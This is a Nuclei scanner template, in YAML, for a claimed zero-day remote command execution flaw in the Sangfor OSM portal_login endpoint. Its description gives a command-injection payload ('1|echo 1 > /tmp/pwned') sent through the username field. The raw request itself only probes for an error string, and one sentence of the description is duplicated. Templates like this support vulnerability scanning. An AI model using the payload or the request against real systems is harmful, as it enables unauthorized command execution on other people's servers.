id: sangfor-osm-protal-login-rce

info:
  name: Sangfor OSM portal_login - Remote Code Execution
  author: qwtd
  severity: critical
  description: |
    Sangfor OSM portal_login contains a remote code execution vulnerability. An attacker can execute arbitrary commands on the server via the "username" parameter.Sangfor OSM portal_login contains a remote code execution vulnerability. An attacker can execute arbitrary commands on the server via the username parameter.
    0day!!!
    POST data 
    1|echo 1 > /tmp/pwned
  tags: SANGFOR-运维安全管理系统
  
http:
  - raw:
      - |
        POST /fort/portal_login HTTP/1.1
        Host: {{Hostname}}
        Cookie: FORTSESSIONID=5772D5A4A2B1512723DFA5EC7A24C21C
        Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
        Sec-Ch-Ua-Mobile: ?0
        Sec-Ch-Ua-Platform: "Windows"
        Accept-Language: zh-CN
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate, br
        Priority: u=0, i
        Connection: keep-alive
        Content-Type: application/raw
        Content-Length: 21

        1

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "loginUrl为空"
      - type: status
        status:
          - 200